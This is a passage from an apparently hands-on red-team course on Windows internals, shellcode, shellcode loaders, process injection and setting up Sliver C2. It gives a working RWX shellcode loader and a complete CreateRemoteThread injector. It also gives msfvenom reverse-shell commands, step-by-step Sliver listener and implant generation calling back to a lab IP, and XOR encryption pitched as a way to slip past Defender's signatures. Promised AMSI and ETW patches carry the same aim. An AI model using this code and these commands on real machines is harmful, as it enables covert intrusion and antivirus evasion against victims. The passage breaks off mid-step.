    LPVOID pNtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory is at: %p\n", pNtAllocateVirtualMemory);
    
    return 0;
}
```

This is exactly how shellcode finds API addresses at runtime!

---

# CHAPTER 25: What is a DLL

## Introduction

DLL = Dynamic Link Library

A DLL is a file containing code and data that multiple programs can use.

Instead of every program having its own copy of "show a message box", they all share `user32.dll` which contains `MessageBox()`.

## Why DLLs Exist

1. **Saves memory** - One copy in RAM, many programs use it
2. **Saves disk space** - Not duplicated in every .exe
3. **Easy updates** - Update the DLL, all programs get the fix
4. **Modular code** - Separate pieces, easier to manage

## Important Windows DLLs

| DLL | Contains |
|-----|----------|
| kernel32.dll | Core Windows functions (files, memory, processes) |
| ntdll.dll | Low-level functions, syscall stubs |
| user32.dll | User interface (windows, messages, input) |
| gdi32.dll | Graphics (drawing, fonts, bitmaps) |
| advapi32.dll | Security, registry, services |
| ws2_32.dll | Network sockets |

## Hands-On: See What DLLs a Process Uses

In PowerShell:
```powershell
Get-Process notepad | Select-Object -ExpandProperty Modules | 
    Select-Object ModuleName, FileName, BaseAddress | 
    Format-Table -AutoSize
```

This shows all DLLs loaded by notepad!

## Hands-On: Load a DLL in C

```c
#include <windows.h>
#include <stdio.h>

int main() {
    printf("Loading user32.dll...\n");
    
    // Load the DLL
    HMODULE hUser32 = LoadLibrary("user32.dll");
    
    if (hUser32 == NULL) {
        printf("Failed to load. Error: %d\n", GetLastError());
        return 1;
    }
    
    printf("user32.dll loaded at: %p\n", hUser32);
    
    // Get address of MessageBoxA
    typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
    
    MessageBoxA_t pMessageBoxA = (MessageBoxA_t)GetProcAddress(hUser32, "MessageBoxA");
    
    if (pMessageBoxA) {
        printf("MessageBoxA is at: %p\n", pMessageBoxA);
        
        // Call it!
        pMessageBoxA(NULL, "Hello from loaded DLL!", "Test", MB_OK);
    }
    
    // Unload the DLL
    FreeLibrary(hUser32);
    printf("DLL unloaded.\n");
    
    return 0;
}
```

This loads user32.dll, finds MessageBoxA, and calls it!

## DLL Injection

This is a key attack technique:

1. Load YOUR DLL into a target process
2. Your DLL's code runs inside that process
3. Now you have code execution in their process

```c
// Simplified concept (actual code is more complex)
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

// Allocate memory in target for DLL path
LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen, ...);

// Write DLL path to target
WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);

// Create thread in target that calls LoadLibrary with our path
CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, remotePath, 0, NULL);

// Now our DLL is loaded in the target process!
```

## Export and Import Tables

**Export Table:** Lists functions the DLL provides to others.
- `kernel32.dll` exports `CreateFile`, `VirtualAlloc`, etc.

**Import Table:** Lists functions the program needs from DLLs.
- `notepad.exe` imports `MessageBox` from `user32.dll`

When Windows loads a program, it reads the import table and fills in the addresses from each DLL's export table.

---

*End of Portion 6 - Chapters 21, 22, 23, 24, 25*

*What you learned:*
- *Process is an isolated environment for a program*
- *Thread is the actual execution path (one process can have many)*
- *Virtual memory gives each process its own address space*
- *Windows API is how we ask Windows to do things*
- *DLLs are shared libraries containing reusable code*

*Hands-on programs we wrote:*
- *Create a process (start notepad)*
- *List all processes*
- *Create threads*
- *Allocate memory with VirtualAlloc*
- *Find function addresses with GetProcAddress*
- *Load DLLs and call their functions*

*Next portion: Shellcode and Code Injection*

---

# PART 6: SHELLCODE AND CODE INJECTION

---

# CHAPTER 26: What is Shellcode

## Introduction

You have heard the word "shellcode" many times. Now let us understand what it actually is.

## Simple Definition

Shellcode is **just bytes** that, when executed by the CPU, do something useful (for the attacker).

That is it.

It is not magic. It is not special. It is just machine code - the same bytes that any program becomes after compilation.

## Why is it Called "Shellcode"?

Historically, the goal of early exploit payloads was to spawn a shell (command prompt).

If you got a shell, you could run any command. So the code that gave you a shell was called "shell code" → "shellcode".

Today, shellcode does much more than spawn shells. But the name stuck.

## What Makes Shellcode Different from a Normal Program?

Normal program (EXE):
- Has a PE header
- Has sections (.text, .data, etc.)
- Needs Windows to load it
- Has imports that Windows resolves

Shellcode:
- **No headers** - Just raw bytes
- **Position-independent** - Works no matter where in memory it is placed
- **Self-contained** - Finds its own API addresses
- **Usually small** - Just does one thing efficiently

## Example: The Simplest Possible Shellcode

Here is shellcode that does absolutely nothing (just returns):

```
C3
```

That is it. One byte. In assembly:

```asm
ret    ; Return to caller
```

If you execute this byte, the CPU will return from wherever it was called.

## Example: Shellcode That Exits Cleanly

This is still simple but does something:

```
31 C0    ; xor eax, eax     - Set EAX to 0 (exit code 0)
50       ; push eax         - Push 0 on stack (uExitCode parameter)
68 ?? ?? ?? ??  ; push address of ExitProcess
C3       ; ret              - "Return" to ExitProcess
```

This exits the program with code 0. (The ?? ?? ?? ?? would be replaced with the actual address of ExitProcess)

## What Sliver Shellcode Does

When Sliver generates shellcode, it creates bytes that:

1. Find the address of key functions (LoadLibrary, GetProcAddress)
2. Load any DLLs it needs (like ws2_32.dll for networking)
3. Create a network connection back to your C2 server
4. Set up an encrypted communication channel
5. Wait for commands and execute them

All of this is packed into the shellcode bytes.

## How Big is Shellcode?

**Tiny shellcode:** 50-200 bytes
- Simple tasks like spawning calc.exe or popping a message box

**Medium shellcode:** 500-2000 bytes
- Reverse shell, download and execute

**Sliver shellcode:** 50,000+ bytes
- Full implant with encryption, evasion, multiple protocols

## Where Does Shellcode Come From?

**Option 1: Generate with tools**
- Sliver: `generate --mtls <ip>:<port> --format shellcode`
- msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f c`
- Cobalt Strike: Attacks → Packages → Windows Executable (S)

**Option 2: Write it yourself**
- Write in assembly
- Assemble to bytes
- This is for small, custom payloads

---

# CHAPTER 27: How Shellcode is Written

## Introduction

Let us understand how shellcode is actually created. This will help you understand what Sliver gives you.

## The Challenge: Position Independence

When you compile a normal program, addresses are fixed. The program says "call function at 0x00401234".

But shellcode does not know where it will be placed in memory. Maybe at 0x00010000, maybe at 0x7FFE1234.

If it uses fixed addresses, it will crash when placed somewhere else.

**Solution:** Shellcode must find addresses at runtime.

## Finding Kernel32.dll

Almost all Windows shellcode needs functions from kernel32.dll.

How does shellcode find kernel32.dll?

**Method: Walk the PEB (Process Environment Block)**

Every Windows process has a PEB structure. The PEB contains a list of loaded modules (DLLs).

Shellcode walks this list to find kernel32.dll:

```asm
; Get PEB address (stored in GS register on x64)
mov rax, gs:[0x60]           ; RAX = PEB address

; Get PEB_LDR_DATA
mov rax, [rax + 0x18]        ; RAX = PEB->Ldr

; Get first module in list
mov rax, [rax + 0x20]        ; RAX = InMemoryOrderModuleList

; Walk list to find kernel32.dll
; (skip ntdll, skip exe, find kernel32)
mov rax, [rax]               ; Second entry
mov rax, [rax]               ; Third entry (usually kernel32)
mov rax, [rax + 0x20]        ; DllBase of kernel32
```

Now RAX contains the address where kernel32.dll is loaded!

## Finding Functions: GetProcAddress

Once we have kernel32.dll, we need to find functions like LoadLibrary and GetProcAddress.

Shellcode reads kernel32.dll's export table:

1. Find the PE header in kernel32
2. Find the export directory
3. Walk the list of exported function names
4. Compare each name to "GetProcAddress"
5. When found, get the function address

This is complex, but it works no matter where kernel32 is loaded.

## Example: Simple MessageBox Shellcode (Concept)

Here is the logic (simplified):

```
1. Find kernel32.dll base address
2. Find GetProcAddress function
3. Use GetProcAddress to find LoadLibraryA
4. LoadLibraryA("user32.dll") - now user32 is loaded
5. GetProcAddress(user32, "MessageBoxA") - get MessageBoxA address
6. Call MessageBoxA(NULL, "Hello", "Title", MB_OK)
7. Exit or return
```

When assembled, this becomes something like:

```
\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x10\x48\x89\x74\x24\x18\x57
\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x48
... (many more bytes)
```

## Avoiding Bad Characters

Some situations do not allow certain bytes in shellcode:

**Null bytes (0x00):** Many string functions stop at 0x00
**Newlines (0x0A, 0x0D):** HTTP headers cannot contain these
**Other characters:** Depends on the vulnerability

Shellcode writers use tricks to avoid these:
- `xor eax, eax` instead of `mov eax, 0` (avoids 0x00000000)
- Encoding/decoding stubs
- Different instruction sequences that produce the same result

## Hands-On: Look at msfvenom Shellcode

On your Kali machine:

```bash
msfvenom -p windows/x64/messagebox TEXT="Hello" TITLE="Test" -f c
```

Output:
```c
unsigned char buf[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
...
```

Each `\xfc` is one byte. This is shellcode that will pop a message box.

---

# CHAPTER 28: What is a Shellcode Loader

## Introduction

Shellcode is just bytes. It cannot run by itself like an .exe file.

You need a **loader** - a program that:
1. Puts the shellcode in memory
2. Makes that memory executable
3. Jumps to the shellcode (runs it)

## The Simplest Loader

```c
#include <windows.h>
#include <stdio.h>

// Shellcode bytes go here
unsigned char shellcode[] = 
"\x90\x90\x90\x90"   // NOP NOP NOP NOP (placeholder)
"\xcc"               // INT3 (breakpoint - will crash debugger)
"\xc3";              // RET (return)

int main() {
    printf("Shellcode size: %d bytes\n", sizeof(shellcode));
    printf("Shellcode at: %p\n", shellcode);
    
    // Step 1: Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(
        NULL,                           // Any address
        sizeof(shellcode),              // Size
        MEM_COMMIT | MEM_RESERVE,       // Allocate it
        PAGE_EXECUTE_READWRITE          // RWX permissions
    );
    
    if (exec_mem == NULL) {
        printf("VirtualAlloc failed\n");
        return 1;
    }
    
    printf("Executable memory at: %p\n", exec_mem);
    
    // Step 2: Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    printf("Shellcode copied\n");
    
    // Step 3: Execute the shellcode
    printf("Executing shellcode...\n");
    
    // Cast the memory address to a function pointer and call it
    ((void(*)())exec_mem)();
    
    printf("Shellcode returned\n");
    
    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}
```

Compile:
```
cl loader.c
```

## What Each Step Does

**Step 1: VirtualAlloc**
- Allocates fresh memory
- PAGE_EXECUTE_READWRITE means we can write to it AND execute it
- This is the key - normally data memory is not executable

**Step 2: memcpy**
- Copies our shellcode bytes into the executable memory
- Now the bytes are sitting in memory with execute permission

**Step 3: Execute**
- `((void(*)())exec_mem)()` is ugly but simple
- It says: "Treat exec_mem as a function pointer and call it"
- The CPU now executes our shellcode bytes

## Hands-On: Real MessageBox Shellcode

Let us use real shellcode. Generate on Kali:

```bash
msfvenom -p windows/x64/messagebox TEXT="Hacked!" TITLE="Red Team" -f c
```

Copy the output bytes and paste into the loader:

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
// ... paste all the bytes here
;

int main() {
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode), 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    ((void(*)())exec_mem)();
    
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
```

Compile and run - you should see a message box!

## Why Defender Will Catch This

If you try this with Sliver shellcode, Defender will probably catch it.

Why?
1. **Signature detection:** Defender knows what Sliver shellcode looks like
2. **Behavioral detection:** Allocating RWX memory and executing it is suspicious
3. **AMSI:** If using PowerShell, AMSI scans the content

This is why we need evasion techniques (coming in later chapters).

---

# CHAPTER 29: What is Process Injection

## Introduction

Running shellcode in your own process works, but has problems:
- If the user closes your program, the shellcode dies
- Investigation finds your suspicious program easily
- Some shellcode needs to be in a specific process

**Solution:** Inject shellcode into another process!

## What Process Injection Means

Instead of running shellcode in your own process, you:
1. Pick a target process (like notepad.exe or explorer.exe)
2. Allocate memory in THAT process
3. Write shellcode to THAT process
4. Create a thread in THAT process that runs the shellcode

Now the shellcode runs inside notepad! If someone investigates, they see notepad acting strangely.

## Classic Process Injection Steps

```
┌─────────────────────┐      ┌─────────────────────┐
│   YOUR PROCESS      │      │   TARGET PROCESS    │
│   (injector.exe)    │      │   (notepad.exe)     │
│                     │      │                     │
│  1. OpenProcess() ──────────→ Get handle         │
│                     │      │                     │
│  2. VirtualAllocEx() ───────→ Allocate memory   │
│                     │      │   in target         │
│                     │      │                     │
│  3. WriteProcessMemory() ───→ Copy shellcode    │
│                     │      │   to target         │
│                     │      │                     │
│  4. CreateRemoteThread() ───→ Run shellcode!    │
│                     │      │                     │
└─────────────────────┘      └─────────────────────┘
```

## Hands-On: Process Injection in C

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// For this example, we use harmless shellcode (NOP NOP RET)
// In real use, this would be Sliver shellcode
unsigned char shellcode[] = "\x90\x90\x90\xc3";

// Find process ID by name
DWORD GetProcessIdByName(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return 0;
}

int main() {
    // Step 1: Find target process
    DWORD targetPID = GetProcessIdByName("notepad.exe");
    
    if (targetPID == 0) {
        printf("Could not find notepad.exe. Please open it first.\n");
        return 1;
    }
    
    printf("Found notepad.exe with PID: %d\n", targetPID);
    
    // Step 2: Open the target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,  // We need full access
        FALSE,               // Don't inherit handle
        targetPID
    );
    
    if (hProcess == NULL) {
        printf("OpenProcess failed. Error: %d\n", GetLastError());
        return 1;
    }
    
    printf("Opened process successfully\n");
    
    // Step 3: Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,                       // Target process
        NULL,                           // Let Windows choose address
        sizeof(shellcode),              // Size
        MEM_COMMIT | MEM_RESERVE,       // Allocate it
        PAGE_EXECUTE_READWRITE          // RWX
    );
    
    if (remoteBuffer == NULL) {
        printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("Allocated memory in target at: %p\n", remoteBuffer);
    
    // Step 4: Write shellcode to the target process
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(
        hProcess,           // Target process
        remoteBuffer,       // Destination
        shellcode,          // Source
        sizeof(shellcode),  // Size
        &bytesWritten       // How many bytes written
    );
    
    if (!success) {
        printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("Wrote %zu bytes to target\n", bytesWritten);
    
    // Step 5: Create a thread in the target that executes our shellcode
    HANDLE hRemoteThread = CreateRemoteThread(
        hProcess,           // Target process
        NULL,               // Default security
        0,                  // Default stack size
        (LPTHREAD_START_ROUTINE)remoteBuffer,  // Start address = our shellcode
        NULL,               // No parameters
        0,                  // Run immediately
        NULL                // Don't need thread ID
    );
    
    if (hRemoteThread == NULL) {
        printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("Created remote thread successfully!\n");
    printf("Shellcode is now running in notepad.exe!\n");
    
    // Wait for thread to complete (optional)
    WaitForSingleObject(hRemoteThread, INFINITE);
    
    // Cleanup
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    printf("Done.\n");
    return 0;
}
```

## Try It:

1. Open notepad.exe
2. Compile the injection program: `cl injector.c`
3. Run it: `injector.exe`
4. It injects into notepad!

With the harmless shellcode (NOP NOP RET), notepad will not visibly do anything. But the shellcode ran inside notepad's process.

## Why This Technique is Powerful

- Shellcode runs in a legitimate process
- Harder to detect (it is just notepad doing "something")
- Survives if your injector program closes
- Can inject into higher privileged processes

## Why This Gets Detected

- OpenProcess with PROCESS_ALL_ACCESS is suspicious
- VirtualAllocEx allocating RWX memory is suspicious
- CreateRemoteThread is heavily monitored by EDRs

Modern evasion uses different techniques:
- APC injection (QueueUserAPC)
- Thread hijacking
- Direct syscalls to avoid hooks
- Unhooking ntdll

We cover evasion in the next chapters.

---

*End of Portion 7 - Chapters 26, 27, 28, 29*

*What you learned:*
- *Shellcode is just machine code bytes that run when executed*
- *Shellcode must find API addresses at runtime (position independent)*
- *A loader allocates executable memory, copies shellcode, and jumps to it*
- *Process injection runs shellcode inside another process*
- *CreateRemoteThread is the classic injection method*

*Hands-on code we wrote:*
- *Simple shellcode loader*
- *Process injection - inject into notepad.exe*

*Next portion: Command and Control with Sliver*

---

# PART 7: INITIAL ACCESS - BYPASSING DEFENDER WITH SLIVER

> **IMPORTANT**: We are NOT disabling Defender! We are BYPASSING it with AMSI patches, ETW patches, and encrypted shellcode!

---

# 📖 PART 7.0: Cryptography Crash Course (The Fun Version!)

Before we encrypt our shellcode, let's understand encryption. No code here - just fun examples!

## What is Encryption?

**Encryption** = Scrambling a message so only the right person can read it.

Think of it like a secret language between you and your friend:

```
ORIGINAL MESSAGE:     "MEET ME AT THE PARK"
ENCRYPTED MESSAGE:    "PHHW PH DW WKH SDUN"
```

Anyone who intercepts the message sees gibberish. But your friend, who knows the SECRET KEY, can unscramble it back!

---

## 🔄 Cipher #1: Caesar Cipher (The OG Encryption)

Julius Caesar used this 2000+ years ago to send secret military orders!

### How It Works

**Shift every letter by a fixed number.**

Let's use a shift of 3:
```
A → D
B → E
C → F
...
X → A
Y → B
Z → C
```

### Example

**Message:** ATTACK AT DAWN
**Shift:** 3

```
A → D
T → W
T → W
A → D
C → F
K → N

Result: DWWDFN DW GDZQ
```

### Try It Yourself!

Decrypt this (shift of 3):
```
KHOOR ZRUOG
```

<details>
<summary>Click to see answer</summary>

**HELLO WORLD**

H←K, E←H, L←O, L←O, O←R, etc.
</details>

### Why It's BAD for Security

Only 25 possible shifts! A computer can try all of them in microseconds.

---

## 🔁 Cipher #2: ROT13 (The Internet's Favorite Toy)

**ROT13** = "Rotate by 13"

It's a Caesar cipher with shift = 13. Special property: **Apply it twice and you get back the original!**

### Why 13?

The alphabet has 26 letters. 13 is exactly half.
```
A ↔ N
B ↔ O
C ↔ P
...
M ↔ Z
```

### The Magic

```
Original:    HELLO
ROT13:       URYYB
ROT13 again: HELLO  ← Back to original!
```

### Fun Fact

ROT13 is used on the internet to hide spoilers and punchlines!

```
Why did the chicken cross the road?
Answer: Gb trg gb gur bgure fvqr!
```

Decrypt it: **To get to the other side!**

### Try It!

What does this say?
```
FRPERG ZRFFNTR
```

<details>
<summary>Click for answer</summary>

**SECRET MESSAGE**
</details>

---

## ⊕ Cipher #3: XOR (The Hacker's Best Friend)

This is what we'll use to encrypt our shellcode!

### What is XOR?

**XOR** = "Exclusive OR"

It's a simple rule:
```
Same = 0
Different = 1
```

### The Truth Table

```
0 XOR 0 = 0   (same = 0)
0 XOR 1 = 1   (different = 1)
1 XOR 0 = 1   (different = 1)
1 XOR 1 = 0   (same = 0)
```

### The Magic Property

**XOR something twice with the same key = Original!**

```
Message:     1010
Key:         1100
─────────────────
XOR result:  0110  (encrypted)

Now XOR with key again:
Encrypted:   0110
Key:         1100
─────────────────
XOR result:  1010  ← ORIGINAL!
```

### Real Example with Letters

Let's encrypt "A" with key "K":

**Step 1:** Convert to binary
```
A = 01000001 (65 in decimal)
K = 01001011 (75 in decimal)
```

**Step 2:** XOR each bit
```
01000001  (A)
01001011  (K)
────────
00001010  (result = 10 in decimal = newline character)
```

**Step 3:** To decrypt, XOR with K again!
```
00001010  (encrypted)
01001011  (K)
────────
01000001  = A (back to original!)
```

### Why Hackers Love XOR

1. **Super fast** - Computers do XOR in nanoseconds
2. **Reversible** - Same operation encrypts and decrypts
3. **Breaks signatures** - Defender can't recognize the pattern

```
SLIVER SHELLCODE:  4D 5A 90 00 03 00 00 00...
XOR with key 0x35: 78 6F A5 35 36 35 35 35...
                   ↑ Defender: "I don't recognize this!"
```

### Try It!

```
What is 1011 XOR 0110?
```

<details>
<summary>Click for answer</summary>

```
1011
0110
────
1101
```
Different, different, same, different = 1101
</details>

---

## 🔐 Cipher #4: AES (The Real Deal)

**AES** = Advanced Encryption Standard

This is what banks, governments, and the military use. It's MUCH stronger than XOR.

### How Strong?

AES-256 has 2^256 possible keys. That's:
```
115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936
```

If you tried 1 billion keys per second, it would take longer than the age of the universe to try them all!

### How AES Works (Simplified)

1. **Split** message into 16-byte blocks
2. **Substitute** each byte using a secret table
3. **Shift** rows around
4. **Mix** columns mathematically
5. **Repeat** steps 2-4 multiple times (10-14 rounds)

Each round makes it exponentially harder to crack!

### AES vs XOR

| Feature | XOR | AES |
|---------|-----|-----|
| Speed | Super fast | Fast |
| Security | Weak (if key is short) | Extremely strong |
| Use case | Obfuscation, quick hiding | Real encryption |
| Key size | Any | 128, 192, or 256 bits |

### Why We Use XOR Instead of AES for Shellcode

For our purpose, we just need to **fool Defender's signature scanner**. 

- AES is overkill
- XOR is simpler to implement
- Both hide the pattern equally well for our use case

---

## 🎯 The Big Picture

```
┌─────────────────────────────────────────────────────────────────┐
│                    ENCRYPTION SUMMARY                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CAESAR/ROT13:                                                  │
│  - Shift letters by N positions                                 │
│  - Easy to crack (only 25 possibilities)                        │
│  - Good for hiding spoilers, bad for secrets                    │
│                                                                 │
│  XOR:                                                           │
│  - Flip bits based on key                                       │
│  - Same operation encrypts AND decrypts                         │
│  - Perfect for breaking malware signatures                      │
│  - We'll use this for our shellcode!                            │
│                                                                 │
│  AES:                                                           │
│  - Complex mathematical transformations                         │
│  - Virtually uncrackable with proper key                        │
│  - Used by banks, military, governments                         │
│  - Overkill for our use case                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Quick Quiz!

**Q1:** If I XOR 0101 with 1010, what do I get?
<details>
<summary>Answer</summary>
1111 (all bits are different)
</details>

**Q2:** What's special about ROT13?
<details>
<summary>Answer</summary>
Apply it twice and you get the original back! (Because 13 + 13 = 26 = full alphabet)
</details>

**Q3:** Why don't we just use AES to encrypt our shellcode?
<details>
<summary>Answer</summary>
XOR is simpler and fast. For breaking Defender's signature detection, XOR is sufficient. AES is overkill.
</details>

**Q4:** Decrypt this ROT13: "UNPXRE"
<details>
<summary>Answer</summary>
HACKER
</details>

---

*Now you understand encryption! Let's use XOR to hide our shellcode from Defender...*

---

# 📖 PART 7.1: Setting Up Your Attacker Machine (Kali)

Now we start the actual work. Follow EXACTLY.

## 7.1.1: What is Kali Linux?

**Kali Linux** = A Linux operating system made for hackers.

It comes preinstalled with hundreds of hacking tools. It's what you'll use for:
- Attacking systems
- Running C2 servers
- Cracking passwords
- Network scanning

**In our lab, Kali is at IP address `192.168.100.100`.**

## 7.1.2: Installing Sliver C2 (Step by Step)

### Step 7.1.2.1: Open Terminal on Kali

1. Log into your Kali machine
2. Click the terminal icon in the taskbar (black rectangle icon)
3. Or press `Ctrl + Alt + T`

You should see:
```
┌──(kali㉿kali)-[~]
└─$ _
```

### Step 7.1.2.2: Check if Sliver is Already Installed

Type this command and press Enter:
```bash
which sliver-server
```

If you see:
```
/usr/local/bin/sliver-server
```
**Sliver is installed! Skip to Step 7.1.2.5.**

If you see nothing (blank output): **Sliver is not installed. Continue to next step.**

### Step 7.1.2.3: Install Sliver

Type this command and press Enter:
```bash
curl https://sliver.sh/install | sudo bash
```

**What this command does:**
- `curl https://sliver.sh/install` = Downloads the install script from sliver.sh website
- `|` = Pipe (send output to next command)
- `sudo bash` = Run the script as administrator

You'll be asked for password:
```
[sudo] password for kali:
```

Type your Kali password (default is `kali`) and press Enter. 
**Note: Password won't show as you type. That's normal.**

Wait for installation (2-5 minutes):
```
[*] Downloading Sliver...
[*] Installing Sliver...
[*] Installation complete!
```

### Step 7.1.2.4: Verify Installation

Type this command:
```bash
sliver-server version
```

You should see something like:
```
sliver-server v1.5.42
Git commit: abc123
Compiled: Mon Dec 25 2024
```

### Step 7.1.2.5: Start Sliver Server

Type this command:
```bash
sudo sliver-server
```

**What happens:**
- Sliver starts up
- You'll see a cool ASCII banner
- You get a new prompt: `[server] sliver >`

**What you should see:**
```
    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain introspection

[server] sliver > _
```

⚠️ **Keep this terminal window open! This is your C2 server.**

## 7.1.3: Understanding Sliver's Interface

You're now in the Sliver console. Let's understand it.

### The Prompt
```
[server] sliver >
```
- `[server]` = You're connected to the Sliver server
- `sliver >` = Waiting for your command

### Getting Help
Type:
```
help
```
You'll see all available commands. There are many. Don't worry, we'll only use a few.

### Important Commands We'll Use

| Command | What It Does |
|---------|--------------|
| `https` | Create a listener for HTTPS connections |
| `generate` | Create a new payload/implant |
| `websites` | Host files on Sliver's web server |
| `sessions` | List connected implants |
| `use` | Interact with a session |
| `jobs` | List running listeners |

---

**END OF PART 7.1**

---

# 📖 PART 7.2: Creating the Listener

## 7.2.1: What is a Listener?

### The Simple Explanation

A listener is like a phone waiting for calls.

When your payload runs on the victim's computer, it needs to "call home" to your Kali machine. The listener is what picks up that call.

```
VICTIM (WS01)                         ATTACKER (KALI)
┌─────────────────┐                   ┌─────────────────┐
│ Payload runs    │                   │                 │
│ "Calling home   │ ────HTTPS────────►│ LISTENER        │
│  to 192.168.100 │                   │ "Incoming call  │
│  .100:443..."   │                   │  from WS01!"    │
└─────────────────┘                   └─────────────────┘
```

### Why HTTPS on Port 443?

- **HTTPS** = Encrypted (can't see what's inside)
- **Port 443** = Normal web browsing port (not suspicious)

If you used a weird port like 4444, firewalls might block it. Port 443 is almost always allowed.

## 7.2.2: Creating an HTTPS Listener (Exact Commands)

### Step 7.2.2.1: Create the Listener

In your Sliver console, type this command EXACTLY:
```
https --lhost 192.168.100.100 --lport 443
```
Press Enter.

**What each part means:**
- `https` = Create an HTTPS listener
- `--lhost 192.168.100.100` = Listen on this IP (your Kali's IP)
- `--lport 443` = Listen on port 443

### Step 7.2.2.2: Verify It's Running

You should see:
```
[*] Starting HTTPS listener ...
[*] Successfully started job #1 (https://192.168.100.100:443)
```

**If you see an error like "port already in use":**
```bash
# In a NEW terminal (not Sliver), run:
sudo lsof -i :443
# This shows what's using port 443

# Kill it:
sudo kill -9 <PID>

# Then try the https command again in Sliver
```

### Step 7.2.2.3: Double-Check with `jobs`

Type:
```
jobs
```

You should see:
```
 ID   Name   Protocol   Port
════════════════════════════
 1    https  https      443
```

This confirms your listener is running.

**Your Kali is now WAITING for connections on port 443!**

---

**END OF PART 7.2**

---

# 📖 PART 7.3: Generating Raw Shellcode

Now we create the actual malicious code that will run on the victim.

## 7.3.1: Why Shellcode Instead of EXE?

Sliver can generate a complete EXE, so why do we want raw shellcode?

**If Sliver generates the EXE:**
- Sliver controls how it runs
- Limited evasion options
- Defender knows what Sliver EXEs look like = **DETECTED**

**If WE generate shellcode and wrap it ourselves:**
- WE control how it runs
- WE add our own evasion (AMSI bypass, etc.)
- Defender doesn't recognize our custom loader = **EVASION**

## 7.3.2: Generating Shellcode (Exact Command)

### Step 7.3.2.1: Run the Generate Command

In Sliver console, type this command EXACTLY (it's one long command):
```
generate --http 192.168.100.100:443 --os windows --arch amd64 --format shellcode --skip-symbols --save /tmp/
```
Press Enter.

### Step 7.3.2.2: Understand What You Typed

| Part | Meaning |
|------|---------|
| `generate` | Create a new implant |
| `--http 192.168.100.100:443` | Implant will connect to this address (your listener) |
| `--os windows` | Target Windows OS |
| `--arch amd64` | 64-bit architecture (modern computers) |
| `--format shellcode` | Output as raw bytes (not EXE!) |
| `--skip-symbols` | Don't include debug info (smaller, harder to analyze) |
| `--save /tmp/` | Save to /tmp/ folder |

### Step 7.3.2.3: What You Should See

```
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 23s
[*] Implant saved to /tmp/RANDOM_NAME.bin
```

The file name will be random like `DELICIOUS_GRAPE.bin` or similar. **Note down the name!**

### Step 7.3.2.4: Rename the File (Easier to Work With)

Open a **NEW terminal window** (not Sliver), and run:
```bash
# First, see what file was created
ls -la /tmp/*.bin

# Rename to simpler name
mv /tmp/RANDOM_NAME.bin /tmp/implant.bin
```
Replace `RANDOM_NAME` with the actual name from Step 7.3.2.3.

### Step 7.3.2.5: Check the File

```bash
# See file size
ls -la /tmp/implant.bin

# Should show something like:
# -rw-r--r-- 1 root root 8234567 Dec 27 12:00 /tmp/implant.bin
```

The file size will be **8-15 MB** typically.

### Step 7.3.2.6: Peek at the Shellcode (Optional, For Learning)

```bash
# See first 50 bytes as hex
xxd /tmp/implant.bin | head -5
```

Output looks like:
```
